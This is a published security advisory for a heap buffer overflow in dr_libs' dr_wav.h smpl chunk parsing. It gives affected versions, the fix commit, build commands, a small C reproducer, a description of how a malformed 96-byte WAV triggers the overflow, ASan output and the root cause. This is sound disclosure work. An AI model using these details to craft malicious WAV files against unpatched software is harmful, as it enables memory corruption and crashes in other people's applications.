# dr_libs dr_wav.h: Heap Buffer Overflow in smpl Chunk Metadata Parsing

- **CVE ID:** [CVE-2026-29022](https://www.cve.org/CVERecord?id=CVE-2026-29022)
- **Product:** [dr_libs](https://github.com/mackron/dr_libs)
- **Reported:** 2026-02-27
- **Published:** 2026-02-28
- **Severity:** Medium (Denial of Service)
- **CWE:** [CWE-122: Heap-based Buffer Overflow](https://cwe.mitre.org/data/definitions/122.html)
- **Discovered by:** Ana Kapulica of Marlink Cyber

---

## Summary

A heap buffer overflow was identified in `drwav__read_smpl_to_metadata_obj()` in `dr_wav.h`, reachable via any `drwav_init_*_with_metadata()` call on untrusted input. The two-pass metadata parser allocates storage based on a validated chunk count in pass 1, but pass 2 processes `smpl` chunks unconditionally. If a `smpl` chunk's `sampleLoopCount` field does not match the size-derived count, the chunk is skipped in pass 1 (no allocation slot reserved) but still written in pass 2, overflowing the heap allocation with 9 struct field writes (36 bytes of attacker-controlled data).

---

## Affected Versions

| Version              | Status    |
| -------------------- | --------- |
| dr_libs <= v0.14.4   | Vulnerable |
| dr_libs > v0.14.4    | Patched   |

Fixed in commit [8a7258cc66b49387ad58cc5b81568982a3560d49](https://github.com/mackron/dr_libs/commit/8a7258cc66b49387ad58cc5b81568982a3560d49).

---

## Proof of Concept

### 1. Build the Reproducer

```
unzip crash.zip
clang -fsanitize=address -O1 -g -o repro repro_file.c
./repro crash.wav
```

The included `generate_crash.py` reconstructs `crash.wav` from scratch as a 96-byte malformed WAV file. It builds a minimal RIFF/WAVE container with a valid `fmt` and empty `data` chunk, an unknown chunk to consume the single allocation slot, and a `smpl` chunk whose `sampleLoopCount` field (1) does not match the size-derived count (0) — the exact mismatch that causes pass 1 to skip it while pass 2 processes it unconditionally.

```
$ wc -c crash.wav
96 crash.wav
```

[crash.wav](./MCSAID-2026-001-dr-libs-heap-overflow-crash.wav)

### 2. Reproducer Source (`repro_file.c`)

```c
#define DR_WAV_IMPLEMENTATION
#include "dr_wav.h"
#include <stdio.h>

int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <file.wav>\n", argv[0]);
        return 1;
    }
    drwav wav;
    if (drwav_init_file_with_metadata(&wav, argv[1], 0, NULL))
        drwav_uninit(&wav);
    return 0;
}
```

### 3. ASan Output

Confirmed on v0.14.4, Ubuntu 24.04, clang 18:

```
$ clang -fsanitize=address -O1 -g -o repro repro_file.c && ./repro crash.wav 
=================================================================
==4495==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50b0000000b0 at pc 0x5f49c590a5c5 bp 0x7ffecc1e6f30 sp 0x7ffecc1e6f28
WRITE of size 4 at 0x50b0000000b0 thread T0
    #0 0x5f49c590a5c4 in drwav__read_smpl_to_metadata_obj /home/.../dr_libs_audit/./dr_wav.h:2193:61
    #1 0x5f49c590a5c4 in drwav__metadata_process_chunk /home/.../dr_libs_audit/./dr_wav.h:2751:29
    #2 0x5f49c58f26a0 in drwav_init__internal /home/.../dr_libs_audit/./dr_wav.h:3699:33
    #3 0x5f49c5907984 in drwav_init_file__internal_FILE /home/.../dr_libs_audit/./dr_wav.h:5319:14
    #4 0x5f49c5907984 in drwav_init_file_with_metadata /home/.../dr_libs_audit/./dr_wav.h:5365:12
    #5 0x5f49c5907984 in main /home/.../dr_libs_audit/repro_file.c:11:9
    #6 0x7245b2a2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x7245b2a2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x5f49c5816374 in _start (/home/.../dr_libs_audit/repro+0x2e374) (BuildId: 0337265132a0782c06a7987a4a6081f63747a8a0)

0x50b0000000b0 is located 0 bytes after 112-byte region [0x50b000000040,0x50b0000000b0)
allocated by thread T0 here:
    #0 0x5f49c58b11c3 in malloc (/home/.../dr_libs_audit/repro+0xc91c3) (BuildId: 0337265132a0782c06a7987a4a6081f63747a8a0)
    #1 0x5f49c590afa5 in drwav__metadata_alloc /home/.../dr_libs_audit/./dr_wav.h:2147:40

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/.../dr_libs_audit/./dr_wav.h:2193:61 in drwav__read_smpl_to_metadata_obj
```

---

## Root Cause

`drwav__metadata_process_chunk` runs in two stages over the file. In the **count stage** (~line 2737), `smpl` chunks are only counted when `sampleLoopCount` matches `(sizeInBytes - DRWAV_SMPL_BYTES) / DRWAV_SMPL_LOOP_BYTES`; mismatching chunks are silently skipped, so no allocation slot is reserved. In the **read stage** (~line 2751), the same chunk is handled unconditionally for any `sizeInBytes >= DRWAV_SMPL_BYTES`, and `drwav__read_smpl_to_metadata_obj` writes 9 fields (36 bytes) into `&pParser->pMetadata[metadataCursor]` — which points past the end of the allocation — before reaching the loop-count check at line 2208.

---

## Impact

Any application using `drwav_init_*_with_metadata()` to open untrusted WAV files is affected. A crafted WAV file triggers a heap buffer overflow write of 36 bytes of attacker-controlled data past the end of the allocated metadata array, resulting in memory corruption and crash.

---

## Mitigations

- Update dr_libs to the latest commit on the master branch (fix merged 2026-02-28).
- Avoid passing untrusted WAV files to `drwav_init_*_with_metadata()` on unpatched versions.

---

## References

- GitHub Issue: [heap-buffer-overflow in drwav__read_smpl_to_metadata_obj (dr_wav.h:2193)](https://github.com/mackron/dr_libs/issues/296)
- Fix Commit: [Fix merged into master branch by the maintainer](https://github.com/mackron/dr_libs/commit/8a7258cc66b49387ad58cc5b81568982a3560d49)
